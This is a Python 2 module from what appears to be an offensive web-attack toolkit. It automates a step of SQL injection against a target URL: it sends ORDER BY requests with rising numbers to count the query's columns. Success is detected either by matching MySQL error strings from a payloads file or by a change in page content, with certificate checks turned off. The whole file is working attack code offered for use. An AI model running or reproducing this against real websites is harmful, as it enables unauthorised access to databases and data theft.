"""
    - created on march/20/2019
    - author topcodermc
    -- [ description of this module:
        this class get how many columns that taget has
    ]
"""
try:

    from Config.WebConfig import define_headerdata
    from src.Colors import TextColor

    from time import sleep
    import json
    import requests

except Exception as error:
    raise SystemExit, 'we have error on : %s' % error


def LodingBanner():
    print TextColor.WARNING + "[+] Please wait until we find count of columns" + TextColor.WHITE


def __ErrorBase_Injection__(text, number):
    with open("./WebAttack/sqlinjection/payloads/OrderByInjectionAndError.json") as jsonFile:
        errorList = json.load(jsonFile)
        for item in errorList["mysql"]["error"]:
            if text.lower().find(item.lower().replace('number', str(number))) is not -1:
                return True
        return False


def GetColumns(errorType, orderCluase, url):

    LodingBanner()

    if errorType == 'ErrorBase':

        for counter in xrange(1, 1000):

            response = requests.get(url=url + orderCluase.replace("value", str(counter)),
                                    headers=define_headerdata, verify=False)

            if __ErrorBase_Injection__(text=response.text, number=counter):
                return counter - 1
            else:
                continue

    elif errorType == 'ContentBase':

        firstResponse = requests.get(url=url, headers=define_headerdata, verify=False)

        for counter in xrange(1, 1000):

            response = requests.get(url=url + orderCluase.replace("value", str(counter)),
                                    headers=define_headerdata, verify=False)

            if response.text != firstResponse.text:
                return counter - 1
            else:
                continue
